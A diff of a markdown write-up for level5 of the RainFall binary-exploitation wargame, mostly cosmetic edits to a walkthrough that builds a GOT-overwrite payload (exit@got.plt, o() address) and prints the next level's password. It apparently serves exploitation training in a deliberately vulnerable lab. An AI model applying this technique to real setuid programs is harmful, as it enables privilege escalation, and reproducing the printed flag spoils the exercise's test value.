@@ -1,12 +1,10 @@
-<p align="justify">
-
-level5 protections:
+Level5 protections:
 ```Shell
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
 ```
 
-level5 rights:
+Level5 rights:
 ```Shell
 level5@RainFall:~$ ls -la level5 
 -rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
@@ -36,15 +34,14 @@ Dump of assembler code for function exit@plt:
 End of assembler dump.
 ```
 
-We can see that the first step consists in jumping to an address. If we investigate this address with the `x` option in GDB, here is what we get:
+We can see that the first step consists in jumping to an address. The `x` option in gdb allows us to view the memory content at a specified address or a variable name. If we investigate this address, this is what we get:
 ```Shell
 (gdb) x 0x8049838
 0x8049838 <exit@got.plt>:       0x080483d6
 ```
-Therefore the jump was indeed done to the address of `exit()`, which converted to Little Endian is: `\x38\x98\x04\x08`. This will be the first part of our payload, as it will sit at the start of our buffer.
+Therefore the jump was indeed done to the address of `exit()`, which converted to little endian is: `\x38\x98\x04\x08`. This will be the first part of our payload, as it will sit at the start of our buffer.
 
-
-Now let's get the address of `o()`. The x option in gdb allow us to view the memory content at a specified address or a variable name:
+Now let's get the address of `o()`:
 ```Shell
 (gdb) x o
 0x80484a4 <o>:  0x83e58955
@@ -72,5 +69,3 @@ level5@RainFall:~$ cat /tmp/payload5 - | ./level5
 cat /home/user/level6/.pass
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
-
-</p>
